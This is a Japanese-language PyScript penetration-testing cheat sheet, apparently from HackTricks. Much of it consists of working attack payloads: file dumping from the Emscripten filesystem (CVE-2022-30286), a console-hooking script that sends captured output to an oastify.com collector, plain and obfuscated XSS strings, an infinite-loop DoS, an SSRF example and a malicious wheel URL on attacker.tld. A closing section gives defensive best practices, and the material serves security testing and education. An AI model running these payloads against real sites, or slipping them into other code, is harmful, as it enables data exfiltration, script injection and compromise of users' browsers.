# Pyscript

## PyScript Pentesting Guide

PyScriptは、PythonをHTMLに統合し、HTMLと並行して使用できるようにするために開発された新しいframeworkです。このcheat sheetでは、penetration testingの目的でPyScriptを使用する方法を説明します。

### Emscripten virtual memory filesystemからのファイルのDumping / Retrieving：

`CVE ID: CVE-2022-30286`.<sup>[[3]](#references)[[7]](#references)</sup>\
\
コード：
```html
<py-script>
with open('/lib/python3.10/site-packages/_pyodide/_base.py', 'r') as fin: out
= fin.read() print(out)
</py-script>
```
結果:

![PyScript Pentesting Guide - Emscripten 仮想メモリファイルシステムからのファイルの Dumping / Retrieving: = fin.read() print(out)](https://user-images.githubusercontent.com/66295316/166847974-978c4e23-05fa-402f-884a-38d91329bac3.png)

### [Emscripten 仮想メモリファイルシステムの OOB Data Exfiltration（console monitoring）](https://github.com/s/jcd3T19P0M8QRnU1KRDk/~/changes/Wn2j4r8jnHsV8mBiqPk5/blogs/the-art-of-vulnerability-chaining-pyscript)

`CVE ID: CVE-2022-30286`.<sup>[[3]](#references)[[7]](#references)</sup>\
\
Code:
```html
<py-script>
x = "CyberGuy" if x == "CyberGuy": with
open('/lib/python3.10/asyncio/tasks.py') as output: contents = output.read()
print(contents) print('
<script>
console.pylog = console.log
console.logs = []
console.log = function () {
console.logs.push(Array.from(arguments))
console.pylog.apply(console, arguments)
fetch("http://9hrr8wowgvdxvlel2gtmqbspigo8cx.oastify.com/", {
method: "POST",
headers: { "Content-Type": "text/plain;charset=utf-8" },
body: JSON.stringify({ content: btoa(console.logs) }),
})
}
</script>
')
</py-script>
```
Result:

![Emscripten仮想メモリファイルシステムからのファイルのDumping / Retrieving - Emscripten仮想メモリファイルシステムのOOB Data Exfiltration（コンソール監視）：Cross Site Scripting...](https://user-images.githubusercontent.com/66295316/166848198-49f71ccb-73cf-476b-b8f3-139e6371c432.png)

### Cross Site Scripting（通常）

Code:
```python
<py-script>
print("<img src=x onerror='alert(document.domain)'>")
</py-script>
```
Result:

![OOB Data Exfiltration of the Emscripten virtual memory filesystem (console monitoring) - Cross Site Scripting (Ordinary): Cross Site Scripting (Python Obfuscated)](https://user-images.githubusercontent.com/66295316/166848393-e835cf6b-992e-4429-ad66-bc54b98de5cf.png)

### Cross Site Scripting (Python Obfuscated)

コード:
```python
<py-script>
sur = "\u0027al";fur = "e";rt = "rt"
p = "\x22x$$\x22\x29\u0027\x3E"
s = "\x28";pic = "\x3Cim";pa = "g";so = "sr"
e = "c\u003d";q = "x"
y = "o";m = "ner";z = "ror\u003d"

print(pic+pa+" "+so+e+q+" "+y+m+z+sur+fur+rt+s+p)
</py-script>
```
結果:

![Cross Site Scripting (通常) - Cross Site Scripting (Python Obfuscated): print(pic+pa+" "+so+e+q+" "+y+m+z+sur+fur+rt+s+p)](https://user-images.githubusercontent.com/66295316/166848370-d981c94a-ee05-42a8-afb8-ccc4fc9f97a0.png)

### Cross Site Scripting (JavaScript Obfuscation)

コード:
```html
<py-script>
prinht(""
<script>
var _0x3675bf = _0x5cf5
function _0x5cf5(_0xced4e9, _0x1ae724) {
var _0x599cad = _0x599c()
return (
(_0x5cf5 = function (_0x5cf5d2, _0x6f919d) {
_0x5cf5d2 = _0x5cf5d2 - 0x94
var _0x14caa7 = _0x599cad[_0x5cf5d2]
return _0x14caa7
}),
_0x5cf5(_0xced4e9, _0x1ae724)
)
}
;(function (_0x5ad362, _0x98a567) {
var _0x459bc5 = _0x5cf5,
_0x454121 = _0x5ad362()
while (!![]) {
try {
var _0x168170 =
(-parseInt(_0x459bc5(0x9e)) / 0x1) *
(parseInt(_0x459bc5(0x95)) / 0x2) +
(parseInt(_0x459bc5(0x97)) / 0x3) *
(-parseInt(_0x459bc5(0x9c)) / 0x4) +
-parseInt(_0x459bc5(0x99)) / 0x5 +
(-parseInt(_0x459bc5(0x9f)) / 0x6) *
(parseInt(_0x459bc5(0x9d)) / 0x7) +
(-parseInt(_0x459bc5(0x9b)) / 0x8) *
(-parseInt(_0x459bc5(0x9a)) / 0x9) +
-parseInt(_0x459bc5(0x94)) / 0xa +
(parseInt(_0x459bc5(0x98)) / 0xb) *
(parseInt(_0x459bc5(0x96)) / 0xc)
if (_0x168170 === _0x98a567) break
else _0x454121["push"](_0x454121["shift"]())
} catch (_0x5baa73) {
_0x454121["push"](_0x454121["shift"]())
}
}
})(_0x599c, 0x28895),
prompt(document[_0x3675bf(0xa0)])
function _0x599c() {
var _0x34a15f = [
"15170376Sgmhnu",
"589203pPKatg",
"11BaafMZ",
"445905MAsUXq",
"432bhVZQo",
"14792bfmdlY",
"4FKyEje",
"92890jvCozd",
"36031bizdfX",
"114QrRNWp",
"domain",
"3249220MUVofX",
"18cpppdr",
]
_0x599c = function () {
return _0x34a15f
}
return _0x599c()
}
</script>
"")
</py-script>
```
結果:

![Cross Site Scripting (Python Obfuscated) - Cross Site Scripting (JavaScript Obfuscation): DoS攻撃（無限ループ）](https://user-images.githubusercontent.com/66295316/166848442-2aece7aa-47b5-4ee7-8d1d-0bf981ba57b8.png)

### DoS攻撃（無限ループ）

コード:
```html
<py-script>
while True:
print("&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;")
</py-script>
```
結果:

![Cross Site Scripting (JavaScript Obfuscation) - DoS攻撃 (Infinity loop):...](https://user-images.githubusercontent.com/66295316/166848534-3e76b233-a95d-4cab-bb2c-42dbd764fefa.png)

---

## 新たな脆弱性とテクニック (2023-2025)

### 制御されていないリダイレクトを介したServer-Side Request Forgery (CVE-2025-50182)

`urllib3 >= 2.2.0, < 2.5.0` は、Pyodideのbrowser transportと併用した場合、リクエストの`redirect`および`retries`パラメータを無視します。攻撃者がターゲットURLに影響を与えられる場合、urllib3にリダイレクトを無効化するよう指示していても、コードがドメイン間リダイレクトに従う可能性があり、SSRF防御が損なわれます。<sup>[[1]](#references)[[4]](#references)</sup>
```html
<script type="py">
import urllib3
http = urllib3.PoolManager()
r = http.request(
"GET",
"https://evil.example/302",
retries=False,
redirect=False,
)  # ignored by affected Pyodide/browser runtimes
print(r.status, r.url)
</script>
```
Node.js では `urllib3 >= 2.5.0` にアップグレードします。ただし、browser で redirect を無効化するために urllib3 に依存せず、リクエストを実行する前に宛先を検証または allow-list に登録してください。<sup>[[4]](#references)</sup>

### 任意の package loading と supply-chain attacks

PyScript の Pyodide configuration は `packages` で任意の wheel URL を受け入れます。攻撃者がその configuration を変更または注入できる場合、その後の import によって、被害者の browser で攻撃者が制御する Python が実行される可能性があります。<sup>[[5]](#references)[[6]](#references)</sup>
```html
<py-config>
packages = ["https://attacker.tld/payload-0.0.1-py3-none-any.whl"]
</py-config>
<script type="py">
import payload  # executes attacker-controlled code at import
</script>
```
Pyodide は、パッケージを WebAssembly 用にビルドしなくても、任意の URL から pure-Python wheels をインストールできます。<sup>[[6]](#references)</sup> この設定は developer-controlled にし、パッケージ名または URL の完全一致による allow-list を使用し、build または deployment 中に remote wheel の digest を検証してください。

### Output sanitisation changes (2023+)

* legacy examples で使用されている 2022.05.1 の実装では、`print()` は HTML escaping なしで `text/plain` output を書き込むため、XSS の危険があります。<sup>[[8]](#references)</sup>
* 現在の `display()` helper は、plain strings に対してデフォルトで **HTML を escape** します。raw markup を使用する場合は、`pyscript.HTML()` でラップする必要があります。<sup>[[2]](#references)</sup>
```python
from pyscript import display, HTML

display("<b>escaped</b>")          # renders literally

display(HTML("<b>not-escaped</b>")) # executes as HTML -> potential XSS if untrusted
```
信頼できない入力には `display()` を使用し、信頼できない文字列を `HTML()` に渡さないでください。<sup>[[2]](#references)</sup>

---

## 防御のベストプラクティス

* **パッケージを最新に保つ** – Node.js では `urllib3 >= 2.5.0` を使用し、ブラウザーのリダイレクトに関する前提を個別に確認します。<sup>[[4]](#references)</sup>
* **パッケージソースを制限する** – PyPI の名前または正確な信頼済み URL を allow-list に登録し、ビルドまたはデプロイ中にリモート wheel のダイジェストを検証します。<sup>[[5]](#references)[[6]](#references)</sup>
* **Content Security Policy を強化する** – inline JavaScript（`script-src 'self' 'sha256-…'`）を禁止し、注入された `<script>` ブロックが実行できないようにします。
* **ユーザーが提供した `<py-script>` / `<script type="py">` タグを禁止する** – 他のユーザーに返す前に、サーバー上で HTML を sanitise します。
* **worker を分離する** – worker から DOM への同期アクセスが不要な場合は、`sync_main_only` flag を有効にして `SharedArrayBuffer` と、それに伴う CORS header の要件を回避します。<sup>[[5]](#references)</sup>

## References

- [1] [NVD – CVE-2025-50182](https://nvd.nist.gov/vuln/detail/CVE-2025-50182)
- [2] [PyScript 組み込み機能のドキュメント – `display` と `HTML`](https://docs.pyscript.net/2024.6.1/user-guide/builtins/)
- [3] [Cyber Guy - 脆弱性 chaining の技法（PyScript）](https://cyber-guy.gitbook.io/cyber-guy/blogs/the-art-of-vulnerability-chaining-pyscript)
- [4] [urllib3 security advisory – CVE-2025-50182](https://github.com/urllib3/urllib3/security/advisories/GHSA-48p4-8xcf-vxj5)
- [5] [PyScript configuration のドキュメント – packages と `sync_main_only`](https://docs.pyscript.net/2026.7.3/user-guide/configuration/)
- [6] [Pyodide – パッケージの読み込み](https://pyodide.org/en/stable/usage/loading-packages.html)
- [7] [NVD – CVE-2022-30286](https://nvd.nist.gov/vuln/detail/CVE-2022-30286)
- [8] [PyScript 2022.05.1 `pyscript.py` の実装](https://github.com/pyscript/pyscript/blob/2022.05.1/pyscriptjs/src/pyscript.py)
{{#include ../../banners/hacktricks-training.md}}
